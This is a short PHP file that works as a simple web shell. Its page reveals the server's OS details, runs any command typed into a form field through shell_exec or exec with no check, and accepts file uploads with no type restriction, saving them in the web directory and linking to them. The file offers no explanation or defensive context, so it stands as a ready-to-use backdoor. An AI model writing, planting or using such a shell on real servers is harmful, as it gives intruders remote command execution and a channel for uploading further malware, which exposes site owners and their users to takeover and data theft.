
<?php
function create_page(){
    echo('<!DOCTYPE html>');
    echo('<html>');
    echo('    <body>');
    echo('        <form action="" method="post">');
    echo('            <br>');
    echo('            <label for="method">Execution Method:</label>');
    echo('            <select name="exec" id="method">');
    echo('                <option value="shell_exec">shell_exec</option>');
    echo('                <option value="exec">exec</option>');
    echo('            </select>');
    echo('');
    echo('            <br>');
    echo('            <br>');
    echo('            <input type=text name="in1">');
    echo('            <input type=submit name="btn" value="Execute">');
    echo('            <br>');
    echo('            <br>');
    echo('');
    echo('        </form>');
    echo('        <form method="post" enctype="multipart/form-data">');
    echo('            Upload Files<br>');
    echo('            <input type="file" name="fileToUpload" id="fileToUpload">');
    echo('            <input type="submit" value="Upload" name="submit">');
    echo('        </form>');
    echo('    </body>');
    echo('</html>');

    return 1;
}

echo ('<p>OS Version</p>');
echo php_uname();

$a = create_page();

if(isset($_POST['btn']))
{

    $command=$_POST['in1'];
    $exec_method=$_POST['exec'];

    echo $command, "<br><br>";
    if ($exec_method == "shell_exec"){
        echo(shell_exec($command));
    } else {
        echo(exec($command));
    }
}

if(array_key_exists('submit', $_POST)) {
    upload_it();
}

function upload_it() {

    $target_file = basename($_FILES["fileToUpload"]["name"]);
    $uploadOk = 1;

    // Check if file already exists
    if (file_exists($target_file)) {
        echo "Sorry, file already exists.";
        $uploadOk = 0;
    }

    // Check file size
    if ($_FILES["fileToUpload"]["size"] > 500000) {
        echo "Sorry, your file is too large.";
        $uploadOk = 0;
    }

    // Check if $uploadOk is set to 0 by an error
    if ($uploadOk == 0) {
        echo "Sorry, your file was not uploaded.";
    // if everything is ok, try to upload file
    } else {
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "The file ". htmlspecialchars( basename( $_FILES["fileToUpload"]["name"])). " has been uploaded. ";
            echo "<a href='$target_file'>Here</a>";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    }
} 
?>
